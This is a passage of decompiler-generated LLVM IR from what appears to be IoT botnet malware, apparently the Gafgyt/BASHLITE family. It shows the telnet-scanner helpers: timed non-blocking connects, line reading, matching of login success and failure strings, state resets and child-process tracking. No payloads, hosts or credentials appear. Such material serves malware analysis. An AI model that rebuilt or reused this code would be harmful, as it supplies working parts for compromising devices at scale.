  %storemerge.lcssa = phi i32 [ %arg2, %dec_label_pc_804920d.dec_label_pc_8049215_crit_edge ], [ 0, %entry ]
  store i32 %v2_8049218, i32* @ebx, align 4
  store i32 %v2_8049219, i32* @ebp, align 4
  ret i32 %storemerge.lcssa

; uselistorder directives
  uselistorder i32 %v4_804920a, { 1, 0 }
  uselistorder i32 %storemerge26, { 1, 0, 2 }
  uselistorder i32 %arg2, { 1, 0, 2 }
  uselistorder label %dec_label_pc_80491c8, { 1, 0 }
}

define i32 @recvLine(i32 %arg1, i8* %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %tmp11 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-177 = alloca i8, align 1
  %stack_var_-176 = alloca i32, align 4
  %stack_var_-168 = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v0_804921e = load i32, i32* @edi, align 4
  store i32 %v0_804921e, i32* %stack_var_-8, align 4
  %v4_8049228 = ptrtoint i8* %arg2 to i32
  %v1_8049230 = and i32 %v4_8049228, -256
  %v5_8049232 = call i8* @_memset(i8* %arg2, i32 %v1_8049230, i32 %arg3)
  store i32 30, i32* %stack_var_-176, align 4
  %v2_8049252 = ptrtoint i32* %stack_var_-168 to i32
  %tmp32 = bitcast i32* %stack_var_-168 to i8*
  store i32 %v2_8049252, i32* @edi, align 4
  store i1 false, i1* @df, align 1
  %v5_8049259 = call i8* @_memset(i8* %tmp32, i32 0, i32 32)
  %v2_8049266 = udiv i32 %arg1, 32
  %v1_804926c = urem i32 %arg1, 32
  %v0_804926f = load i32, i32* @ebp, align 4
  %v2_804926f = mul nuw nsw i32 %v2_8049266, 4
  %v3_804926f = add nsw i32 %v2_804926f, -164
  %v4_804926f = add i32 %v3_804926f, %v0_804926f
  %v5_804926f = inttoptr i32 %v4_804926f to i32*
  %v6_804926f = load i32, i32* %v5_804926f, align 4
  %v9_804926f = shl i32 1, %v1_804926c
  %v12_804926f = or i32 %v6_804926f, %v9_804926f
  store i32 %v12_804926f, i32* %v5_804926f, align 4
  %v1_804927a = add i32 %arg1, 1
  %v2_804927b = ptrtoint i32* %stack_var_-176 to i32
  %v6_80492a4 = call i32 @__libc_select(i32 %v1_804927a, i32 %v2_8049252, i32 0, i32 %v2_8049252, i32 %v2_804927b)
  %tmp33 = icmp slt i32 %v6_80492a4, 1
  %tmp34 = icmp eq i1 %tmp33, false
  br i1 %tmp34, label %dec_label_pc_804935b, label %dec_label_pc_8049351.preheader

dec_label_pc_8049351.preheader:                   ; preds = %entry
  %v7_804935546 = icmp sgt i32 %tmp11, 9
  br i1 %v7_804935546, label %dec_label_pc_804935b, label %dec_label_pc_80492bb

dec_label_pc_80492bb:                             ; preds = %dec_label_pc_8049351.preheader, %dec_label_pc_804934e
  %stack_var_-36.047 = phi i32 [ %v4_804934e, %dec_label_pc_804934e ], [ %tmp11, %dec_label_pc_8049351.preheader ]
  %v0_80492bb = load i32, i32* @global_var_805b540.20, align 64
  %v3_80492cb = call i32 @sockprintf(i32 %v0_80492bb, i32 ptrtoint ([5 x i8]* @global_var_8058457.21 to i32))
  store i32 30, i32* %stack_var_-176, align 4
  store i32 %v2_8049252, i32* @edi, align 4
  store i1 false, i1* @df, align 1
  %v5_80492f5 = call i8* @_memset(i8* %tmp32, i32 0, i32 32)
  %v0_804930b = load i32, i32* @ebp, align 4
  %v4_804930b = add i32 %v3_804926f, %v0_804930b
  %v5_804930b = inttoptr i32 %v4_804930b to i32*
  %v6_804930b = load i32, i32* %v5_804930b, align 4
  %v12_804930b = or i32 %v6_804930b, %v9_804926f
  store i32 %v12_804930b, i32* %v5_804930b, align 4
  %v6_8049340 = call i32 @__libc_select(i32 %v1_804927a, i32 %v2_8049252, i32 0, i32 %v2_8049252, i32 %v2_804927b)
  %tmp35 = icmp slt i32 %v6_8049340, 1
  %tmp36 = icmp eq i1 %tmp35, false
  br i1 %tmp36, label %dec_label_pc_804935b, label %dec_label_pc_804934e

dec_label_pc_804934e:                             ; preds = %dec_label_pc_80492bb
  %v4_804934e = add nsw i32 %stack_var_-36.047, 1
  %v7_8049355 = icmp sgt i32 %stack_var_-36.047, 8
  br i1 %v7_8049355, label %dec_label_pc_804935b, label %dec_label_pc_80492bb

dec_label_pc_804935b:                             ; preds = %dec_label_pc_8049351.preheader, %dec_label_pc_80492bb, %dec_label_pc_804934e, %entry
  %v2_804937f = ptrtoint i8* %stack_var_-177 to i32
  br label %dec_label_pc_80493c5

dec_label_pc_804936a:                             ; preds = %dec_label_pc_80493c5
  %v0_804936a = load i32, i32* @global_var_805b540.20, align 64
  %v5_804938c = call i32 @__libc_recv(i32 %v0_804936a, i32 %v2_804937f, i32 1, i32 0)
  %v9_8049391 = icmp eq i32 %v5_804938c, 1
  br i1 %v9_8049391, label %dec_label_pc_80493a8, label %dec_label_pc_8049396

dec_label_pc_8049396:                             ; preds = %dec_label_pc_804936a
  store i8 0, i8* %stack_var_-32.0, align 1
  br label %dec_label_pc_80493e2

dec_label_pc_80493a8:                             ; preds = %dec_label_pc_804936a
  %v3_80493a8 = load i8, i8* %stack_var_-177, align 1
  %v4_80493af = ptrtoint i8* %stack_var_-32.0 to i32
  store i8 %v3_80493a8, i8* %stack_var_-32.0, align 1
  %v5_80493b4 = add i32 %v4_80493af, 1
  %v22_80493b4 = inttoptr i32 %v5_80493b4 to i8*
  %v3_80493b7 = load i8, i8* %stack_var_-177, align 1
  %v10_80493be = icmp eq i8 %v3_80493b7, 10
  br i1 %v10_80493be, label %dec_label_pc_80493d3, label %dec_label_pc_80493c2

dec_label_pc_80493c2:                             ; preds = %dec_label_pc_80493a8
  %v4_80493c2 = add i32 %stack_var_-28.0, 1
  br label %dec_label_pc_80493c5

dec_label_pc_80493c5:                             ; preds = %dec_label_pc_804935b, %dec_label_pc_80493c2
  %stack_var_-32.0 = phi i8* [ %arg2, %dec_label_pc_804935b ], [ %v22_80493b4, %dec_label_pc_80493c2 ]
  %stack_var_-28.0 = phi i32 [ 0, %dec_label_pc_804935b ], [ %v4_80493c2, %dec_label_pc_80493c2 ]
  %stack_var_12.0 = phi i32 [ %arg3, %dec_label_pc_804935b ], [ %v4_80493c5, %dec_label_pc_80493c2 ]
  %v4_80493c5 = add i32 %stack_var_12.0, -1
  %v9_80493c5 = sub i32 0, %stack_var_12.0
  %v10_80493c5 = and i32 %stack_var_12.0, %v9_80493c5
  %v11_80493c5 = icmp slt i32 %v10_80493c5, 0
  %v12_80493c5 = icmp eq i32 %v4_80493c5, 0
  %v13_80493c5 = icmp slt i32 %v4_80493c5, 0
  %v3_80493c9 = icmp eq i1 %v13_80493c5, %v11_80493c5
  %v4_80493c9 = icmp eq i1 %v12_80493c5, false
  %v5_80493c9 = and i1 %v4_80493c9, %v3_80493c9
  %v4_80493cf = icmp eq i1 %v5_80493c9, false
  %v1_80493d1 = icmp eq i1 %v4_80493cf, false
  br i1 %v1_80493d1, label %dec_label_pc_804936a, label %dec_label_pc_80493d3

dec_label_pc_80493d3:                             ; preds = %dec_label_pc_80493a8, %dec_label_pc_80493c5
  %stack_var_-32.1 = phi i8* [ %v22_80493b4, %dec_label_pc_80493a8 ], [ %stack_var_-32.0, %dec_label_pc_80493c5 ]
  store i8 0, i8* %stack_var_-32.1, align 1
  br label %dec_label_pc_80493e2

dec_label_pc_80493e2:                             ; preds = %dec_label_pc_8049396, %dec_label_pc_80493d3
  %storemerge = phi i32 [ -1, %dec_label_pc_8049396 ], [ %stack_var_-28.0, %dec_label_pc_80493d3 ]
  %v2_80493ee = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_80493ee, i32* @edi, align 4
  ret i32 %storemerge

; uselistorder directives
  uselistorder i32 %v4_80493c5, { 2, 1, 0 }
  uselistorder i32 %stack_var_12.0, { 1, 0, 2 }
  uselistorder i8* %stack_var_-32.0, { 1, 0, 2, 3 }
  uselistorder i8* %v22_80493b4, { 1, 0 }
  uselistorder i32 %v2_8049252, { 1, 0, 2, 4, 3, 5 }
  uselistorder i32* %stack_var_-176, { 0, 2, 1 }
  uselistorder i8* %stack_var_-177, { 2, 1, 0 }
  uselistorder i32 %arg3, { 1, 0 }
  uselistorder i32 %arg1, { 2, 1, 0 }
  uselistorder label %dec_label_pc_80493e2, { 1, 0 }
  uselistorder label %dec_label_pc_80493d3, { 1, 0 }
  uselistorder label %dec_label_pc_80493c5, { 1, 0 }
  uselistorder label %dec_label_pc_804935b, { 2, 1, 0, 3 }
  uselistorder label %dec_label_pc_80492bb, { 1, 0 }
}

define i32 @get_telstate_host() local_unnamed_addr {
entry:
  %tmp1 = call i32 @__decompiler_undefined_function_0()
  %v0_80493f1 = load i32, i32* @ebp, align 4
  %v1_80493fa = add i32 %tmp1, 4
  %v2_80493fa = inttoptr i32 %v1_80493fa to i32*
  %v3_80493fa = load i32, i32* %v2_80493fa, align 4
  %v1_8049406 = call i32 @__GI_inet_ntoa(i32 %v3_80493fa)
  store i32 %v0_80493f1, i32* @ebp, align 4
  ret i32 %v1_8049406
}

define i32 @read_until_response(i32 %arg1) local_unnamed_addr {
entry:
  %tmp1 = call i32 @__decompiler_undefined_function_0()
  %tmp5 = call i32 @__decompiler_undefined_function_0()
  %tmp8 = call i32 @__decompiler_undefined_function_0()
  %tmp9 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-8 = alloca i32, align 4
  %v0_8049410 = load i32, i32* @edi, align 4
  store i32 %v0_8049410, i32* %stack_var_-8, align 4
  %v1_804941a = inttoptr i32 %tmp8 to i8*
  store i32 %tmp8, i32* @edi, align 4
  %v1_804941f = and i32 %tmp8, -256
  %v5_8049421 = call i8* @_memset(i8* %v1_804941a, i32 %v1_804941f, i32 %tmp9)
  %v4_804943e = call i32 @read_with_timeout(i32 %arg1, i32 %tmp5, i32 %tmp8, i32 %tmp9)
  %v2_8049453 = inttoptr i32 %tmp1 to i32*
  %v3_8049453 = call i32 @contains_string(i32 %tmp8, i32* %v2_8049453)
  %v1_8049458 = icmp ne i32 %v3_8049453, 0
  %storemerge = zext i1 %v1_8049458 to i32
  %v2_8049472 = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_8049472, i32* @edi, align 4
  ret i32 %storemerge

; uselistorder directives
  uselistorder i32 %tmp9, { 1, 0 }
  uselistorder i32 %tmp8, { 4, 3, 0, 2, 1 }
}

define i32 @read_with_timeout(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %stack_var_-152 = alloca i32, align 4
  %stack_var_-144 = alloca i32, align 4
  store i32 0, i32* %stack_var_-152, align 4
  %v2_804949c = ptrtoint i32* %stack_var_-144 to i32
  %tmp18 = bitcast i32* %stack_var_-144 to i8*
  store i1 false, i1* @df, align 1
  %v5_80494a3 = call i8* @_memset(i8* %tmp18, i32 0, i32 32)
  %v2_80494b0 = udiv i32 %arg1, 32
  %v1_80494b6 = urem i32 %arg1, 32
  %v0_80494b9 = load i32, i32* @ebp, align 4
  %v2_80494b9 = mul nuw nsw i32 %v2_80494b0, 4
  %v3_80494b9 = add nsw i32 %v2_80494b9, -140
  %v4_80494b9 = add i32 %v3_80494b9, %v0_80494b9
  %v5_80494b9 = inttoptr i32 %v4_80494b9 to i32*
  %v6_80494b9 = load i32, i32* %v5_80494b9, align 4
  %v9_80494b9 = shl i32 1, %v1_80494b6
  %v12_80494b9 = or i32 %v6_80494b9, %v9_80494b9
  store i32 %v12_80494b9, i32* %v5_80494b9, align 4
  %v1_80494c4 = add i32 %arg1, 1
  %v4_80494cb = ptrtoint i32* %stack_var_-152 to i32
  %v5_80494ec = call i32 @__libc_select(i32 %v1_80494c4, i32 %v2_804949c, i32 0, i32 0, i32 %v4_80494cb)
  %tmp19 = icmp slt i32 %v5_80494ec, 1
  %tmp20 = icmp eq i1 %tmp19, false
  br i1 %tmp20, label %dec_label_pc_8049501, label %dec_label_pc_8049528

dec_label_pc_8049501:                             ; preds = %entry
  %v4_804951d = call i32 @__libc_recv(i32 %arg1, i32 %arg3, i32 %arg4, i32 0)
  br label %dec_label_pc_8049528

dec_label_pc_8049528:                             ; preds = %entry, %dec_label_pc_8049501
  %storemerge = phi i32 [ %v4_804951d, %dec_label_pc_8049501 ], [ 0, %entry ]
  ret i32 %storemerge

; uselistorder directives
  uselistorder i32* %stack_var_-152, { 1, 0 }
  uselistorder i32 %arg1, { 3, 2, 1, 0 }
  uselistorder label %dec_label_pc_8049528, { 1, 0 }
}

define i32 @advance_state(i32* %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %tmp3 = ptrtoint i32* %arg1 to i32
  %v4_804953d = icmp eq i32 %arg2, 0
  %v6_804953d = trunc i32 %arg2 to i8
  %v1_8049541 = icmp eq i1 %v4_804953d, false
  br i1 %v1_8049541, label %dec_label_pc_8049550, label %dec_label_pc_8049543

dec_label_pc_8049543:                             ; preds = %entry
  %v2_8049546 = load i32, i32* %arg1, align 4
  %v1_804954b = call i32 @__libc_close(i32 %v2_8049546)
  br label %dec_label_pc_8049550

dec_label_pc_8049550:                             ; preds = %entry, %dec_label_pc_8049543
  %v1_8049553 = add i32 %tmp3, 16
  %v2_8049553 = inttoptr i32 %v1_8049553 to i32*
  store i32 0, i32* %v2_8049553, align 4
  %v3_8049562 = add i32 %tmp3, 8
  %v4_8049562 = inttoptr i32 %v3_8049562 to i8*
  store i8 %v6_804953d, i8* %v4_8049562, align 1
  %v1_8049568 = add i32 %tmp3, 24
  %v2_8049568 = inttoptr i32 %v1_8049568 to i32*
  %v3_8049568 = load i32, i32* %v2_8049568, align 4
  %v3_8049581 = inttoptr i32 %v3_8049568 to i8*
  %v4_8049581 = call i32 @__GI_memset(i8* %v3_8049581, i32 0, i32 512)
  ret i32 %v4_8049581

; uselistorder directives
  uselistorder i32 %tmp3, { 2, 1, 0 }
  uselistorder i32 %arg2, { 1, 0 }
  uselistorder label %dec_label_pc_8049550, { 1, 0 }
}

define i32 @reset_telstate(i32 %arg1) local_unnamed_addr {
entry:
  %stack_var_-4 = alloca i32, align 4
  %v0_8049588 = load i32, i32* @ebp, align 4
  store i32 %v0_8049588, i32* %stack_var_-4, align 4
  %v2_804959c = inttoptr i32 %arg1 to i32*
  %v3_804959c = call i32 @advance_state(i32* %v2_804959c, i32 0)
  %v1_80495a4 = add i32 %arg1, 9
  %v2_80495a4 = inttoptr i32 %v1_80495a4 to i8*
  store i8 1, i8* %v2_80495a4, align 1
  %v2_80495a8 = load i32, i32* %stack_var_-4, align 4
  store i32 %v2_80495a8, i32* @ebp, align 4
  ret i32 %arg1

; uselistorder directives
  uselistorder i32 %arg1, { 2, 1, 0 }
}

define i32 @contains_success(i32 %arg1) local_unnamed_addr {
entry:
  %stack_var_-4 = alloca i32, align 4
  %v0_80495aa = load i32, i32* @ebp, align 4
  store i32 %v0_80495aa, i32* %stack_var_-4, align 4
  %v4_80495aa = ptrtoint i32* %stack_var_-4 to i32
  store i32 %v4_80495aa, i32* @ebp, align 4
  %v4_80495be = call i32 @contains_string(i32 %arg1, i32* bitcast ([3 x i8*]* @global_var_805b240.25 to i32*))
  %v2_80495c3 = load i32, i32* %stack_var_-4, align 4
  store i32 %v2_80495c3, i32* @ebp, align 4
  ret i32 %v4_80495be

; uselistorder directives
  uselistorder i32* %stack_var_-4, { 0, 2, 1 }
}

define i32 @contains_fail(i32 %arg1) local_unnamed_addr {
entry:
  %stack_var_-4 = alloca i32, align 4
  %v0_80495c5 = load i32, i32* @ebp, align 4
  store i32 %v0_80495c5, i32* %stack_var_-4, align 4
  %v4_80495c5 = ptrtoint i32* %stack_var_-4 to i32
  store i32 %v4_80495c5, i32* @ebp, align 4
  %v4_80495d9 = call i32 @contains_string(i32 %arg1, i32* bitcast ([7 x i8*]* @global_var_805b220.33 to i32*))
  %v2_80495de = load i32, i32* %stack_var_-4, align 4
  store i32 %v2_80495de, i32* @ebp, align 4
  ret i32 %v4_80495d9

; uselistorder directives
  uselistorder i32* %stack_var_-4, { 0, 2, 1 }
}

define i32 @contains_response(i32 %arg1) local_unnamed_addr {
entry:
  %stack_var_-4 = alloca i32, align 4
  %v0_80495e0 = load i32, i32* @ebp, align 4
  store i32 %v0_80495e0, i32* %stack_var_-4, align 4
  %v4_80495e0 = ptrtoint i32* %stack_var_-4 to i32
  store i32 %v4_80495e0, i32* @ebp, align 4
  %v1_80495ec = call i32 @contains_success(i32 %arg1)
  %v1_80495f1 = icmp eq i32 %v1_80495ec, 0
  %v1_80495f3 = icmp eq i1 %v1_80495f1, false
  br i1 %v1_80495f3, label %dec_label_pc_8049614, label %dec_label_pc_80495f5

dec_label_pc_80495f5:                             ; preds = %entry
  %v1_80495fb = call i32 @contains_fail(i32 %arg1)
  %v1_8049600 = icmp ne i32 %v1_80495fb, 0
  %. = zext i1 %v1_8049600 to i32
  br label %dec_label_pc_8049614

dec_label_pc_8049614:                             ; preds = %dec_label_pc_80495f5, %entry
  %storemerge = phi i32 [ 1, %entry ], [ %., %dec_label_pc_80495f5 ]
  ret i32 %storemerge

; uselistorder directives
  uselistorder i32* %stack_var_-4, { 1, 0 }
  uselistorder i32 %arg1, { 1, 0 }
}

define i32 @contains_string(i32 %arg1, i32* %arg2) local_unnamed_addr {
entry:
  %tmp5 = ptrtoint i32* %arg2 to i32
  %stack_var_-4 = alloca i32, align 4
  %v0_8049619 = load i32, i32* @ebp, align 4
  store i32 %v0_8049619, i32* %stack_var_-4, align 4
  br label %dec_label_pc_8049634

dec_label_pc_8049634:                             ; preds = %dec_label_pc_8049634, %entry
  %stack_var_-12.0 = phi i32 [ 0, %entry ], [ %v4_8049634, %dec_label_pc_8049634 ]
  %v4_8049634 = add i32 %stack_var_-12.0, 1
  %v2_804963a = mul i32 %v4_8049634, 4
  %v5_804963d = add i32 %v2_804963a, %tmp5
  %v1_8049640 = inttoptr i32 %v5_804963d to i32*
  %v2_8049640 = load i32, i32* %v1_8049640, align 4
  %v1_8049642 = icmp eq i32 %v2_8049640, 0
  %v1_8049644 = icmp eq i1 %v1_8049642, false
  br i1 %v1_8049644, label %dec_label_pc_8049634, label %dec_label_pc_8049679.preheader

dec_label_pc_8049679.preheader:                   ; preds = %dec_label_pc_8049634
  %v2_8049664 = inttoptr i32 %arg1 to i8*
  %v5_804967f17 = icmp sgt i32 %v4_8049634, 0
  br i1 %v5_804967f17, label %dec_label_pc_804964f, label %dec_label_pc_8049688

dec_label_pc_804964f:                             ; preds = %dec_label_pc_8049679.preheader, %dec_label_pc_8049676
  %storemerge118 = phi i32 [ %v4_8049676, %dec_label_pc_8049676 ], [ 0, %dec_label_pc_8049679.preheader ]
  %v2_8049652 = mul i32 %storemerge118, 4
  %v5_8049655 = add i32 %v2_8049652, %tmp5
  %v1_8049658 = inttoptr i32 %v5_8049655 to i32*
  %v2_8049658 = load i32, i32* %v1_8049658, align 4
  store i32 %arg1, i32* @eax, align 4
  %v3_8049664 = call i32 @strcasestr(i8* %v2_8049664, i32 %v2_8049658)
  %v1_8049669 = icmp eq i32 %v3_8049664, 0
  br i1 %v1_8049669, label %dec_label_pc_8049676, label %dec_label_pc_8049688

dec_label_pc_8049676:                             ; preds = %dec_label_pc_804964f
  %v4_8049676 = add nuw nsw i32 %storemerge118, 1
  %v5_804967f = icmp slt i32 %v4_8049676, %v4_8049634
  br i1 %v5_804967f, label %dec_label_pc_804964f, label %dec_label_pc_8049688

dec_label_pc_8049688:                             ; preds = %dec_label_pc_804964f, %dec_label_pc_8049676, %dec_label_pc_8049679.preheader
  %storemerge = phi i32 [ 0, %dec_label_pc_8049679.preheader ], [ 0, %dec_label_pc_8049676 ], [ 1, %dec_label_pc_804964f ]
  %v2_804968b = load i32, i32* %stack_var_-4, align 4
  store i32 %v2_804968b, i32* @ebp, align 4
  ret i32 %storemerge

; uselistorder directives
  uselistorder i32 %v4_8049676, { 1, 0 }
  uselistorder i32 %storemerge118, { 1, 0 }
  uselistorder i32 %v4_8049634, { 2, 1, 0, 3 }
  uselistorder label %dec_label_pc_8049688, { 1, 0, 2 }
  uselistorder label %dec_label_pc_804964f, { 1, 0 }
}

define i32 @connectTimeout(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %stack_var_-184 = alloca i32, align 4
  %stack_var_-180 = alloca i32, align 4
  %stack_var_-176 = alloca i32, align 4
  %stack_var_-168 = alloca i32, align 4
  %stack_var_-36 = alloca i32, align 4
  %stack_var_-40 = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v0_8049690 = load i32, i32* @edi, align 4
  store i32 %v0_8049690, i32* %stack_var_-8, align 4
  %v3_80496ad = call i32 @__libc_fcntl(i32 %arg1, i32 3, i32 0)
  %v4_80496b5 = or i32 %v3_80496ad, 2048
  %v3_80496d1 = call i32 @__libc_fcntl(i32 %arg1, i32 4, i32 %v4_80496b5)
  store i32 2, i32* %stack_var_-40, align 4
  %v1_80496e5 = trunc i32 %arg3 to i16
  %v2_80496e5 = call i32 @htons(i16 %v1_80496e5)
  store i32 %arg2, i32* @edx, align 4
  %v3_8049701 = call i32 @getHost(i32 %arg2, i32* nonnull %stack_var_-36)
  %v1_8049706 = icmp eq i32 %v3_8049701, 0
  br i1 %v1_8049706, label %dec_label_pc_8049719, label %dec_label_pc_8049889

dec_label_pc_8049719:                             ; preds = %entry
  %v2_80496f4 = ptrtoint i32* %stack_var_-40 to i32
  %v3_8049741 = call i32 @__libc_connect(i32 %arg1, i32 %v2_80496f4, i32 16)
  %v5_8049749 = icmp slt i32 %v3_8049741, 0
  %v1_804974d = icmp eq i1 %v5_8049749, false
  br i1 %v1_804974d, label %dec_label_pc_8049840, label %dec_label_pc_8049753

dec_label_pc_8049753:                             ; preds = %dec_label_pc_8049719
  %v1_8049753 = call i32 @__errno_location(i32 %v3_8049741)
  %v1_8049758 = inttoptr i32 %v1_8049753 to i32*
  %v2_8049758 = load i32, i32* %v1_8049758, align 4
  %v9_804975a = icmp eq i32 %v2_8049758, 115
  %v1_804975d = icmp eq i1 %v9_804975a, false
  br i1 %v1_804975d, label %dec_label_pc_8049889, label %dec_label_pc_8049763

dec_label_pc_8049763:                             ; preds = %dec_label_pc_8049753
  store i32 %arg4, i32* %stack_var_-176, align 4
  %v2_8049780 = ptrtoint i32* %stack_var_-168 to i32
  %tmp27 = bitcast i32* %stack_var_-168 to i8*
  store i32 %v2_8049780, i32* @edi, align 4
  store i1 false, i1* @df, align 1
  %v5_8049787 = call i8* @_memset(i8* %tmp27, i32 0, i32 32)
  %v2_8049794 = udiv i32 %arg1, 32
  %v1_804979a = urem i32 %arg1, 32
  %v0_804979d = load i32, i32* @ebp, align 4
  %v2_804979d = mul nuw nsw i32 %v2_8049794, 4
  %v3_804979d = add nsw i32 %v2_804979d, -164
  %v4_804979d = add i32 %v3_804979d, %v0_804979d
  %v5_804979d = inttoptr i32 %v4_804979d to i32*
  %v6_804979d = load i32, i32* %v5_804979d, align 4
  %v9_804979d = shl i32 1, %v1_804979a
  %v12_804979d = or i32 %v6_804979d, %v9_804979d
  store i32 %v12_804979d, i32* %v5_804979d, align 4
  %v1_80497a8 = add i32 %arg1, 1
  %v2_80497a9 = ptrtoint i32* %stack_var_-176 to i32
  %v5_80497d0 = call i32 @__libc_select(i32 %v1_80497a8, i32 0, i32 %v2_8049780, i32 0, i32 %v2_80497a9)
  %tmp28 = icmp slt i32 %v5_80497d0, 1
  br i1 %tmp28, label %dec_label_pc_8049889, label %dec_label_pc_80497d9

dec_label_pc_80497d9:                             ; preds = %dec_label_pc_8049763
  store i32 4, i32* %stack_var_-180, align 4
  %v2_80497e3 = ptrtoint i32* %stack_var_-180 to i32
  %v2_80497ed = ptrtoint i32* %stack_var_-184 to i32
  %v5_804980d = call i32 @getsockopt(i32 %arg1, i32 1, i32 4, i32 %v2_80497ed, i32 %v2_80497e3)
  %v3_8049812 = load i32, i32* %stack_var_-184, align 4
  %v1_8049818 = icmp eq i32 %v3_8049812, 0
  br i1 %v1_8049818, label %dec_label_pc_8049840, label %dec_label_pc_8049889

dec_label_pc_8049840:                             ; preds = %dec_label_pc_80497d9, %dec_label_pc_8049719
  %v3_8049856 = call i32 @__libc_fcntl(i32 %arg1, i32 3, i32 0)
  %v4_804985e = and i32 %v3_8049856, -2049
  %v3_804987a = call i32 @__libc_fcntl(i32 %arg1, i32 4, i32 %v4_804985e)
  br label %dec_label_pc_8049889

dec_label_pc_8049889:                             ; preds = %dec_label_pc_8049753, %dec_label_pc_8049763, %dec_label_pc_80497d9, %entry, %dec_label_pc_8049840
  %stack_var_-188.0 = phi i32 [ 1, %dec_label_pc_8049840 ], [ 0, %entry ], [ 0, %dec_label_pc_80497d9 ], [ 0, %dec_label_pc_8049763 ], [ 0, %dec_label_pc_8049753 ]
  %v2_8049895 = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_8049895, i32* @edi, align 4
  ret i32 %stack_var_-188.0

; uselistorder directives
  uselistorder i32* %stack_var_-40, { 1, 0 }
  uselistorder i32* %stack_var_-176, { 1, 0 }
  uselistorder i32* %stack_var_-180, { 1, 0 }
  uselistorder i32 %arg1, { 8, 7, 6, 5, 1, 0, 4, 3, 2 }
  uselistorder label %dec_label_pc_8049889, { 4, 2, 1, 0, 3 }
}

define i32 @listFork() local_unnamed_addr {
entry:
  %stack_var_-8 = alloca i32, align 4
  %v0_804989b = load i32, i32* @ebx, align 4
  store i32 %v0_804989b, i32* %stack_var_-8, align 4
  %v1_804989f = call i32 @__libc_fork(i32 %v0_804989b)
  %v4_80498a7 = icmp eq i32 %v1_804989f, 0
  %v1_80498ab = icmp eq i1 %v4_80498a7, false
  br i1 %v1_80498ab, label %dec_label_pc_80498b8, label %dec_label_pc_80498ad

dec_label_pc_80498ad:                             ; preds = %entry
  br label %dec_label_pc_8049994

dec_label_pc_80498b8:                             ; preds = %entry
  %v0_80498b8 = load i32, i32* @global_var_805b548.34, align 8
  %v0_80498bd = load i32, i32* @global_var_805b54c.35, align 4
  %v1_80498c3 = add i32 %v0_80498b8, 1
  %v5_80498c3 = icmp eq i32 %v0_80498b8, -1
  %v2_80498c6 = zext i1 %v5_80498c3 to i32
  %v3_80498c6 = add i32 %v2_80498c6, %v0_80498bd
  store i32 %v1_80498c3, i32* @global_var_805b548.34, align 8
  store i32 %v3_80498c6, i32* @global_var_805b54c.35, align 4
  %v2_80498e3 = mul i32 %v1_80498c3, 4
  %v1_80498e6 = add i32 %v2_80498e3, 4
  %v1_80498ec = call i32 @malloc(i32 %v1_80498e6)
  br label %dec_label_pc_804991f

dec_label_pc_80498fd:                             ; preds = %dec_label_pc_804991f, %dec_label_pc_8049950
  %v2_8049900 = mul i32 %storemerge1, 4
  %v5_8049905 = add i32 %v2_8049900, %v1_80498ec
  %v0_8049910 = load i32, i32* @global_var_80617d4.36, align 4
  %v2_8049915 = add i32 %v0_8049910, %v2_8049900
  %v1_8049918 = inttoptr i32 %v2_8049915 to i32*
  %v2_8049918 = load i32, i32* %v1_8049918, align 4
  %v2_804991a = inttoptr i32 %v5_8049905 to i32*
  store i32 %v2_8049918, i32* %v2_804991a, align 4
  %v4_804991c = add i32 %storemerge1, 1
  br label %dec_label_pc_804991f

dec_label_pc_804991f:                             ; preds = %dec_label_pc_80498b8, %dec_label_pc_80498fd
  %storemerge1 = phi i32 [ %v4_804991c, %dec_label_pc_80498fd ], [ 0, %dec_label_pc_80498b8 ]
  %v0_804992d = load i32, i32* @global_var_805b548.34, align 8
  %v0_8049932 = load i32, i32* @global_var_805b54c.35, align 4
  %v4_804993c = icmp ne i32 %v0_804992d, 0
  %v2_804993f = zext i1 %v4_804993c to i32
  %v3_804993f = add i32 %v0_8049932, -1
  %v4_804993f = add i32 %v3_804993f, %v2_804993f
  store i32 %v4_804993f, i32* @ebx, align 4
  %v10_804994b = icmp eq i32 %v4_804993f, 0
  br i1 %v10_804994b, label %dec_label_pc_8049950, label %dec_label_pc_80498fd

dec_label_pc_8049950:                             ; preds = %dec_label_pc_804991f
  %v1_804993c = add i32 %v0_804992d, -1
  %v10_804995b = icmp ult i32 %storemerge1, %v1_804993c
  br i1 %v10_804995b, label %dec_label_pc_80498fd, label %dec_label_pc_8049960

dec_label_pc_8049960:                             ; preds = %dec_label_pc_8049950
  %v2_804996b = mul i32 %v0_804992d, 4
  %v5_804996e = add i32 %v2_804996b, %v1_80498ec
  %v1_8049971 = add i32 %v5_804996e, -4
  store i32 %v1_8049971, i32* @edx, align 4
  %v2_8049977 = inttoptr i32 %v1_8049971 to i32*
  store i32 %v1_804989f, i32* %v2_8049977, align 4
  %v0_8049979 = load i32, i32* @global_var_80617d4.36, align 4
  %v1_8049981 = call i32 @free(i32 %v0_8049979)
  store i32 %v1_80498ec, i32* @global_var_80617d4.36, align 4
  store i32 %v1_804989f, i32* @ecx, align 4
  br label %dec_label_pc_8049994

dec_label_pc_8049994:                             ; preds = %dec_label_pc_80498ad, %dec_label_pc_8049960
  %v2_804999a = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_804999a, i32* @ebx, align 4
  ret i32 %v1_804989f

; uselistorder directives
  uselistorder i32 %storemerge1, { 1, 0, 2 }
  uselistorder i32 %v2_8049900, { 1, 0 }
  uselistorder i32 %v1_80498ec, { 2, 0, 1 }
  uselistorder i32 %v0_80498b8, { 1, 0 }
  uselistorder label %dec_label_pc_8049994, { 1, 0 }
  uselistorder label %dec_label_pc_804991f, { 1, 0 }
  uselistorder label %dec_label_pc_80498fd, { 1, 0 }
}

define i32 @negotiate(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %stack_var_-5 = alloca i8, align 1
  %stack_var_-4 = alloca i32, align 4
  %v0_804999d = load i32, i32* @ebp, align 4
  store i32 %v0_804999d, i32* %stack_var_-4, align 4
